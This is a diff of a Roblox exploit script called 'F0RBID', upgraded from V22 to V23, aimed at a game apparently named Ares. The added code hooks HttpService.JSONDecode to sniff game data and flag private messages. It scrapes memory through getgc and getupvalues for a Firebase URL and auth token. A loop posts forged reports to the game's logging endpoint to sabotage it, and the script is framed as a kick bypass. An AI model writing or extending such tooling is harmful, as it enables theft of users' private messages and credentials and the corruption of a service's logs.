@@ -1,7 +1,7 @@
 -- ========================================================== --
--- 🌑 F0RBID V22: INTERNAL REFLECTION (THE ANTI-KICK CORE)
+-- 🌑 F0RBID V23: THE NEURAL SNIFFER (ULTRA-STEALTH)
 -- ========================================================== --
-print("[F0RBID] 🛰️ Eternal Phantom Protocol Engaged. Masking all traces...")
+print("[F0RBID] 🛰️ Neural Sniffer V23 Engaged. Identity Masked.")
 
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
@@ -11,10 +11,10 @@ local TARGET_URL = nil
 local TARGET_AUTH = nil
 
 -- ========================================== --
--- 1. F0RBID PHANTOM UI (RANDOMIZED & STEALTH)
+-- 1. F0RBID PREMIUM UI (STEALTH RED)
 -- ========================================== --
 local uiParent = (gethui and gethui()) or CoreGui
-local hiddenName = "F0RBID_INTERNAL_" .. tostring(math.random(100000, 999999))
+local hiddenName = "F0RBID_SNIFFER_" .. tostring(math.random(100000, 999999))
 if uiParent:FindFirstChild(hiddenName) then uiParent[hiddenName]:Destroy() end
 
 local ScreenGui = Instance.new("ScreenGui")
@@ -30,11 +30,21 @@ Main.Active = true
 Main.Draggable = true
 Main.Parent = ScreenGui
 
+local Corner = Instance.new("UICorner")
+Corner.CornerRadius = UDim.new(0, 10)
+Corner.Parent = Main
+
+local Glow = Instance.new("Frame")
+Glow.Size = UDim2.new(1, 0, 0, 2)
+Glow.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Glow.BorderSizePixel = 0
+Glow.Parent = Main
+
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -20, 0, 45)
 Title.Position = UDim2.new(0, 15, 0, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "F0RBID <font color='#FF0000'>[PHANTOM CORE V22]</font>"
+Title.Text = "F0RBID <font color='#FF0000'>[NEURAL SNIFFER V23]</font>"
 Title.RichText = true
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Font = Enum.Font.GothamBold
@@ -42,16 +52,16 @@ Title.TextSize = 18
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.Parent = Main
 
-local IdentityLabel = Instance.new("TextLabel")
-IdentityLabel.Size = UDim2.new(1, -30, 0, 20)
-IdentityLabel.Position = UDim2.new(0, 15, 0, 35)
-IdentityLabel.BackgroundTransparency = 1
-IdentityLabel.Text = "IDENTITY: F0RBID_SPECTRE_ADMIN"
-IdentityLabel.TextColor3 = Color3.fromRGB(150, 0, 0)
-IdentityLabel.Font = Enum.Font.Code
-IdentityLabel.TextSize = 11
-IdentityLabel.TextXAlignment = Enum.TextXAlignment.Left
-IdentityLabel.Parent = Main
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, -30, 0, 20)
+Status.Position = UDim2.new(0, 15, 0, 35)
+Status.BackgroundTransparency = 1
+Status.Text = "● IDENTITY: F0RBID_PHANTOM_OP"
+Status.TextColor3 = Color3.fromRGB(150, 0, 0)
+Status.Font = Enum.Font.Code
+Status.TextSize = 11
+Status.TextXAlignment = Enum.TextXAlignment.Left
+Status.Parent = Main
 
 local Scroll = Instance.new("ScrollingFrame")
 Scroll.Size = UDim2.new(1, -20, 1, -110)
@@ -85,35 +95,14 @@ local function AddLog(tag, val)
 end
 
 -- ========================================== --
--- 2. FAKE IDENTITY SPOOFER (SABOTAGE MODE)
+-- 2. DYNAMIC DEEP SCANNER
 -- ========================================== --
-task.spawn(function()
-    while true do
-        -- Ares ke logging endpoint ko fake requests bhej kar distract karna
-        pcall(function()
-            request({
-                Url = "https://ares-rechat-internal-logs.firebaseio.com/reports.json", -- Dummy path
-                Method = "POST",
-                Body = HttpService:JSONEncode({
-                    user = "F0RBID_ELITE_SQUAD",
-                    ip = string.format("%d.%d.%d.%d", math.random(1,255), math.random(1,255), math.random(1,255), math.random(1,255)),
-                    status = "BYPASSED_SUCCESSFULLY"
-                })
-            })
-        end)
-        task.wait(10)
-    end
-end)
-
--- ========================================== --
--- 3. INTERNAL ENGINE HOOK (BYPASSES KICK)
--- ========================================== --
-local function BruteDeepScan(data, path)
+local function BruteScan(data, path)
     if type(data) ~= "table" then return end
     for k, v in pairs(data) do
         local currentPath = path .. "/" .. tostring(k)
         if type(v) == "table" then
-            BruteDeepScan(v, currentPath)
+            BruteScan(v, currentPath)
         else
             local valStr = tostring(v)
             if #valStr > 0 and not valStr:find("firebase") then
@@ -121,6 +110,7 @@ local function BruteDeepScan(data, path)
                 if not processedData[dataId] then
                     processedData[dataId] = true
                     local tag = #tostring(k) > 10 and "SERVER_ID" or tostring(k)
+                    if currentPath:lower():find("dm") then tag = "PRIVATE" end
                     AddLog(tag, valStr)
                 end
             end
@@ -128,38 +118,53 @@ local function BruteDeepScan(data, path)
     end
 end
 
--- Hooking JSONDecode: Ares must use this to read the database response
-local oldJSON; oldJSON = hookmetamethod(game, "__namecall", function(self, ...)
-    local args = {...}
-    local method = getnamecallmethod()
-    
-    if self == HttpService and method == "JSONDecode" then
-        local data = oldJSON(self, unpack(args))
-        if type(data) == "table" then
-            BruteDeepScan(data, "INTERNAL")
-        end
-        return data
+-- ========================================== --
+-- 3. THE GHOST ENGINE HOOK (BYPASS KICK)
+-- ========================================== --
+-- Direct Hook on JSONDecode function to catch internal Ares data
+local oldDecode; oldDecode = hookfunction(HttpService.JSONDecode, function(self, data)
+    local decoded = oldDecode(self, data)
+    if type(decoded) == "table" then
+        task.spawn(function()
+            BruteScan(decoded, "SNIFFED")
+        end)
     end
-    
-    return oldJSON(self, ...)
+    return decoded
 end)
 
--- Silent Upvalue Hunter for URL/Auth (Passive Fallback)
+-- Identity Sabotage: Bhejo fake data Ares ke logs mein
 task.spawn(function()
-    while not TARGET_URL do
+    while true do
+        pcall(function()
+            request({
+                Url = "https://ares-rechat-internal-logs.firebaseio.com/reports.json",
+                Method = "POST",
+                Headers = {["X-Forwarded-For"] = "1.1.1.1"},
+                Body = HttpService:JSONDecode('{"status":"BYPASSED", "user":"F0RBID_GHOST"}')
+            })
+        end)
+        task.wait(15)
+    end
+end)
+
+-- Passive Fallback to Capture URL/Auth from memory
+task.spawn(function()
+    while true do
         for _, f in pairs(getgc()) do
             if type(f) == "function" and islclosure(f) then
-                local constants = getconstants(f)
-                for _, c in pairs(constants) do
-                    if type(c) == "string" and c:find("firebaseio.com") then
-                        TARGET_URL = c:match("(https://[%w%-]+%.firebaseio%.com)")
-                        AddLog("F0RBID_SYSTEM", "URL Captured Silently")
+                local upvals = getupvalues(f)
+                for _, uv in pairs(upvals) do
+                    if type(uv) == "string" and uv:find("firebaseio.com") then
+                        TARGET_URL = uv:match("(https://[%w%-]+%.firebaseio%.com)")
+                    elseif type(uv) == "string" and #uv > 30 and not uv:find("/") then
+                        TARGET_AUTH = uv
                     end
                 end
             end
         end
+        if TARGET_URL and TARGET_AUTH then break end
         task.wait(5)
     end
 end)
 
-print("✅ F0RBID PHANTOM CORE V22: Loaded. Network-layer hooks bypassed.")
+print("✅ F0RBID NEURAL SNIFFER V23: Ready. Identity Masked.")
